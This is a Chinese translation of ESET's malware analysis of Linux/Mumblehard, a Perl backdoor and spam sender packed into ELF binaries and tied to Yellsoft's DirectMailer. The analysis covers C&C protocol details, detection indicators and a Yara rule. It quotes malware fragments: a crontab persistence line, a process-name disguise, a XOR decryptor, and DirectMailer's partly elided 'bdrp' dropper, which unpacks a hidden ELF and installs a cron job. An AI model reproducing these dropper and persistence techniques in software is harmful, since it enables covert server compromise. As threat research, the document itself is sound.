# 恶意软件Linux/Mumblehard分析

From:http://www.welivesecurity.com/wp-content/uploads/2015/04/mumblehard.pdf

0x00 简介
=====

我们发现`Linux/ Mumblehard`的原因来自于某天某网管联系我们，他的服务器因为不断发送垃圾邮件被列入了黑名单。我们dump了服务器上其中一个奇怪进程的内存，这玩意连接到了一个不同的SMTP服务器，并发送垃圾邮件。dump下来的内存显示这玩意是一个，唔，perl解释器，随之我们在`/tmp`目录发现了一个相关的可执行文件，并且立即开始着手分析，为了方便我们给这玩意起名`Mumblehard`。

说实话我们对这玩意产生了极大的兴趣，因为在恶意软件中，perl脚本被封装在ELF可执行文件中是很少见的，至少这玩意比起其他来说要更加复杂一些。另外一点是我们发现这款恶意软件与一家叫`Yellsoft`的软件公司存在很大的联系，而第一个被发现的样本在09年提交到VirusTotal。

![enter image description here](http://drops.javaweb.org/uploads/images/b14e27ed8adce0400e11065b6aeef099bf427f31.jpg)

Figure 1. Wayback Machine上显示的Yellsoft主页

我们对所发现已经确认遭到感染的系统进行了调查，确认了两种可能的传播方式，最常见的利用Joomla和Wordpress的exp进行传播，另外一种是通过分布式的后门，`Yellsoft`在他们主页上销售一种叫`DirectMailer`的软件，240美刀，其中装有特殊的后门。

这篇paper描述了恶意软件中的组件的分析，以及我们对受害者的统计调查，还有那家神秘的`Yellsoft`。

0x01 恶意软件分析
=====

我们分析了两种不同的恶意软件组件，第一个是一个通用的后门，向C&C服务器请求一个命令，该命令包含一个网址，然后通过这个网址下载恶意文件并且执行，第二个是一种多功能的垃圾邮件发送器的程序。这两个组件都使用perl进行编写，然后使用一个汇编写的特殊加壳器进行混淆，最终隐藏到一个ELF格式的二进制文件中。

下面的图显示了恶意软件和C&C服务器之间的关系。

![enter image description here](http://drops.javaweb.org/uploads/images/667b2aff9cf266ac235884b8e5aae23e1afa8fb4.jpg)

Figure 2. Linux/Mumblehard的交互

下面我们会先解析加壳器的细节，然后在描述后门和邮件发送器的功能。

### 1.1 ELF二进制中的perl壳

* * *

最初引起我们兴趣的是恶意软件的加壳器，简单看看反汇编代码，我们可以很明显的看出，加壳器是直接使用汇编进行编写，整个加壳大约使用了200个汇编指令。这个观察来源于两个点，一个是他们直接使用`int 80`指令进行系统中断，另一个是它们并不适用常见的方式进行堆栈管理。

通过其系统调用的方式，可执行文件可以避免任何的外部依赖，同时，加壳器被确认适用于linux和bsd系统。因为系统进行了系统调用13，并传入了参数0，该系统调用对应到linux的时间，和BSD的标准输入。在BSD上该调用失败后会返回一个负数到eax上，而linux上会返回一个正数表示从1970年到今天过了几秒。

![enter image description here](http://drops.javaweb.org/uploads/images/2805b7ed3864bdb4045b4b349bec862c795725d2.jpg)

Figure 3. system call 13

之后会`fork()`一个perl解释器`("/usr/bin/perl", ...)`然后通过标准输入将perl脚本发送给进程。并且使用系统调用`pipe`和`dup2`来处理文件描述符。这一来父进程就可以将解密后的perl脚本写入解释器。

#### 1.2 perl后门

* * *

后门实际上只有一个简单的任务，就是从C&C服务器上请求一条命令，并且返回其是否成功。不过后门并不会使用`daemonize`来进行进程守护，他直接使用`crontab`来每15分钟执行一次。

```
$ crontab -l
*/15 * * * * /var/tmp/qCVwOWA >/dev/null 2>&1

```

并且还通过分配`$0`来将自己伪装成httpd。

```
$0 = "httpd";

```

每次运行，后门都会向列表中的后门发送一条查询请求命令，就算某台已经返回过有效的命令。

综合来说该后门只支持一条命令:`0x10`下载并执行。我们分析了手头的样本整理出了下面这样的list，事实上，只有ip：`194.54.81.163`返回过命令，其他应该都是挂掉了，比如，域名`behance.net`在2005年被adobe收购。

• 184.106.208.157 • 194.54.81.163 • advseedpromoan.com • 50.28.24.79 • 67.221.183.105 • seoratingonlyup.net • advertise.com • 195.242.70.4 • pratioupstudios.org • behance.net

#### 1.2.1 C&C通信

* * *

Mumblehard使用http的get对每台C&C服务器发送请求，将返回的命令隐藏在http响应头的Set-Cookie中，来逃避一些数据包的检测。

一个请求的例子

```
HTTP/1.0 200 OK
Date: Sat, 14 Feb 2015 23:01:57 GMT
Server: Apache/1.3.41 (Unix)
Set-Cookie: PHPSESSID=260518103c38332d35373729393e39253e3c3b207f66736577722861646b6c
697e217c647066603a7f66706363606f61; path=/
Content-Length: 18
Connection: close
Content-Type: text/html
under construction

```

PHPSESSID cookie值进行了hex进行编码，并且通过自定义的算法进行加密，该加密算法与加壳器中用来加密perl脚本的算法是相同的.

![enter image description here](http://drops.javaweb.org/uploads/images/350e81368c33bcda592b5e008a38e79d035ce7a2.jpg)

Figure 4. 用汇编写的加密算法

perl版加密

```
sub xorl {
 my ($line, $code, $xor, $lim) = (shift, "", 1, 16);
 foreach my $chr (split (//, $line)) {
  if ($xor == $lim) {
    $lim = 0 if $lim == 256;
    $lim += 16;
    $xor = 1;
  }
  $code .= pack ("C", unpack ("C", $chr) ^ $xor);
  $xor ++;
 }
 return $code;
}

```

一旦解密，下面的信息回从`cookie`中提取出来。

![enter image description here](http://drops.javaweb.org/uploads/images/10f7a29d102c956e29deabe7cc92f0e464a08a59.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/2322b06649b54126ee695844cc0dcc28121223a7.jpg)

这里有一个解密后的信息的例子。

![enter image description here](http://drops.javaweb.org/uploads/images/54a9d7336eae60f732e2baf5bd33a5299e7494d3.jpg)

Mumblehard后门的user-agent

```
Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1

```

该user-agent被验证与windows7上Firefox 7.0.1的user-agent相同。不过在下载完成后，恶意软件会向服务器发送请求报告是否下载了文件，该信息隐藏在user-agent中，格式大概是下面这个样子

```
Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/<command_id>.<http_status>.<downloaded_file_size> Firefox/7.0.1

```

一个实际的例子

```
Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/24.200.56013 Firefox/7.0.1

```

### 1.3 perl恶意邮件发送器

* * *

该恶意软件发送器也是perl写的，并且加壳后嵌入elf可执行文件，目的在于向C&C请求任务，并且发送恶意邮件，Mumblehard支持大部分一个恶意邮件发送器会有的功能，模板，报表，SMTP执行等，我们会将接下来的内容限制在其中的一些独特的功能和网络协议等。

perl本身是兼容多个操作系统的，所以我们认为该恶意软件是针对多个类型的操作系统为目标，不过其中的EWOULDBLOCK和EINPROGRESS常量是不可移植的，尽管如此，该恶意软件的常量还是可以兼容Linux, FreeBSD and Windows。目前我们抓到的样本是无法在windows上运行的，不过也可能表示针对windows平台他们开发了不同类型的加壳器。

其中的perl

```
if ( $^O eq "linux" ) { $ewblock = 11; $eiprogr = 115; }
if ( $^O eq "freebsd" ) { $ewblock = 35; $eiprogr = 36; }
if ( $^O eq "MSWin32" ) { $ewblock = 10035; $eiprogr = 10036; }

```

这玩意有两种方式发送恶意邮件，一种是请求C&C服务器上的一个任务，第二种是开启一个代理。

#### 1.3.1 C&C通信

* * *

C&C服务器运行在端口25上，恶意邮件发送器可以通过post请求发送二进制数据，内容如下表

![enter image description here](http://drops.javaweb.org/uploads/images/0cfc4a7d058d0c275bccf38cf87f205c7ac336bb.jpg)

不过这些数据似乎只在一种情况下会被使用，比如统计有多少服务器在发邮件啥的。它存在4个32位的整数头。

*   任务的表示符
*   成功的邮件数目
*   网络问题失败的邮件数目
*   被SMTP服务器拒绝的邮件数目

恶意主机还可以自定义发送报告的详细程度，其中有三个级别，最低的一级只有数字，中级包括电子邮件地址，最高一级包括成功或者失败的原因。最初的请求，服务器会返回一个200的响应，包含设置，电子邮件列表，和垃圾邮件模版。

![enter image description here](http://drops.javaweb.org/uploads/images/689400bed278c8682a5700296d6f9c1a8b319087.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/36603a13fcd806d67fc243c2f6f4d7330920665e.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/b9f2e95bc882c9262c1438008857d6e8bd23c1ce.jpg)

#### 1.3.2 代理功能的特点

* * *

我们分析的大多数的样本中都包含一个通用的代理组件，工作原理很简单，监听tcp端口的连接，并且发送通知，只有c&c服务器的连接允许连接到该端口，但是内部有一个list，可以自定义添加允许的连接。不过其实只有两条命令会被代理组件识别。

*   添加ip地址到允许列表
*   创建一个新的tcp隧道

下面是用作参考的协议内容

![enter image description here](http://drops.javaweb.org/uploads/images/c34b4dcd3187e5bd27df4335c0636fc96f77b381.jpg)

在创建连接时候实际上使用的是通过SOCKS4协议进行实现，这个功能允许黑客传输任意的流量到服务器，不过蛋疼的是我们并没有见该功能使用过，所以并无法断定是用于什么。

#### 1.3.3 恶意邮件内容

* * *

我们跟踪了大量的恶意邮件，发现主要是用于推广一些药物产品，并且还有产品官方的链接，这里是其中一个例子。

![enter image description here](http://drops.javaweb.org/uploads/images/bf3c660468cc560027bcd460e6930ebdecb8ffdc.jpg)

该恶意邮件的链接贩卖解决性功能障碍的药物的网站。

![enter image description here](http://drops.javaweb.org/uploads/images/bb6dce761dc64267af8691423aa3e86882ad384c.jpg)

具体网站为加拿大的`spamtrackers.eu`，不过其消息头貌似是使用随机的词。

```
Million-Explosively-Arrogance: B77FE821EAB1
Copes-Horribly: 881976c526e6
Formants-Carmichael-Cutlet: consistency
Interoffice-Gastronome-Unmodified: d41f7ebe89a

```

目前还不知道将其添加到反垃圾邮件签名是否有效果，不过我们认为是有的。

0x02 被感染主机的统计
=====

其中恶意服务器支持的C＆C域名其中一部分已经失效，所以我们购买了其中的域名来监控受到感染的服务器，我们使用了恶意软件中用到的特殊的user-agent来进行监控。

下面是我们收集的2014年9月19日到2015年4月22日的数据，大概存在8,867个ip进行连接，其中大部分是用于网站托管的服务器。

![enter image description here](http://drops.javaweb.org/uploads/images/ba9d6ddcc119a93ee18d203eaea484ded7c5e455.jpg)

(此处省略部分关于统计的细节)

0x03 WHO IS YELLSOFT?
=====

样本中的C＆C服务器的ip范围位于 194.54.81.162 到194.54.81.164

```
194.54.81.162:53 Hardcoded DNS server in Mumblehard’s spammer
194.54.81.163:54321 Report from Mumblehard’s proxy is open
194.54.81.163:25 C&C server for Mumblehard’s spammer
194.54.81.164:25 C&C server for Mumblehard’s spammer

```

如果你检查下面的两个ip，你会发现他们都是194.54.81.165和194.54.81.166的名称服务器，其中yellsoft.net web服务器托管 在194.54.81.166，其中162到166的ip的ns和soa都是相同的，这可以表明，这5个ip都是托管在同一台服务器上。

```
$ dig +short -x 194.54.81 SOA | uniq -c 
1 ns1.rx-name.net. hostmaster.81.54.194.in-addr.arpa. 2015031209 28800 7200 604800 86400
$ for i in 2 3 4 5 6; do dig +short -x 194.54.81 SOA @194.54.81.16$i; done | uniq -c 
5 ns1.yellsoft.net. support.yellsoft.net. 2013051501 600 300 604800 600

```

那么Yellsoft是干嘛的，他们销售一种perl编写的批量邮件发送工具，叫DirectMailer。运行在UNIX系统上。

![enter image description here](http://drops.javaweb.org/uploads/images/582d6f93bf420865305efc5cfb44ba11cfe68622.jpg)

### 3.1 DirectMailer分析

* * *

其主页上告诉访客，他们不提供直接下载，下载地址被托管在narod.ru上，我们可以从上面得到副本。在2014年我们下载了一个叫 directmailer-retail.zip 的压缩包，之后ESET讲其识别为恶意软件后，该软件就不再被放置于softexp.narod.ru上。

zip包含一个dm.pl 文件，不过其为elf可执行文件，打包了各种perl脚本。在主程序启动之前，程序会调用一个bdrp的函数，该函数有一个uuencoded编码的blob，解码运行后会生成另一个ELF可执行文件，包含一个加壳后的perl脚本，它会被写入文件系统和cron 15分钟运行一次。很熟悉是不？

bdrp函数

```
sub bdrp {
  my $bdrp = <<'BDRPDATA';
  M?T5,1@$!`0D```````````(``P`!````3(`$""P``````````````#0`(``!
  M``````````"`!`@`@`0("1H``!X>```'`````!```(DE"9H$"+@-````,=M3
  ...
  M)S5I=6=\9&(Z-WQT>'-T?#,@/'YR<%-$`@=,1$A#1$P1"U$-7$I$1$!=#Q5+
  %%T491S$`
  BDRPDATA
  $bdrp = unpack( "u*", $bdrp );
    foreach my $bdrpp ( "/var/tmp", "/tmp" ) {
    # Delete all executable files in temporary directory
    # (delete existing Mumblehard installation)
    for (<$bdrpp/*>) { unlink $_ if ( -f $_ && ( -x $_ || -X $_ ) ); }
    # Create random file name
    my $bdrpn = [ "a" .. "z", "A" .. "Z" ];
    $bdrpn = join( "",
    @$bdrpn[ map { rand @$bdrpn } ( 1 .. ( 6 + int rand 5 ) ) ] );
    my $bdrpb = "$bdrpp/$bdrpn";
    my $bdrpc = $bdrpb . int rand 9;
    # crontab job to add (runs every 15 minutes)
    my $bdrpt = "*/15 * * * * $bdrpb >/dev/null 2>&1\n";
    if ( open( B, ">", $bdrpb ) ) {
    # Drop file and install job with crontab
    [...]
    }
  }
}

```

0x04 结论
=====

恶意软件正在变的越来越复杂，另一个令人担忧的是Mumblehard的运营这么多年一直没中断过。

附录A

UDP packets to

```
•    194.54.81.162 port 53

```

TCP connections to

```
•    194.54.81.163 port 80 (backdoor)
•    194.54.81.163 port 54321 (proxy)
•    194.54.81.163 port 25 (spammer)
•    194.54.81.164 port 25 (spammer)

```

HTTP requests with the following User-Agent pattern

```
•    Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/<1 or more digits>.<1 or
more digits>.<1 or more digits> Firefox/7.0.1

```

yara rule

```
rule mumblehard_packer
{
meta:
 description = "Mumblehard i386 assembly code responsible for decrypting Perl
code"
 author = "Marc-Etienne M.Léveillé"
 date = "2015-04-07"
 reference = "http://www.welivesecurity.com"
 version = "1"
strings:
 $decrypt = { 31 db [1-10] ba ?? 00 00 00 [0-6] (56 5f | 89 F7)
 39 d3 75 13 81 fa ?? 00 00 00 75 02 31 d2 81 c2 ?? 00 00
 00 31 db 43 ac 30 d8 aa 43 e2 e2 }
condition:
 $decrypt
}

```

附录b (参考原文)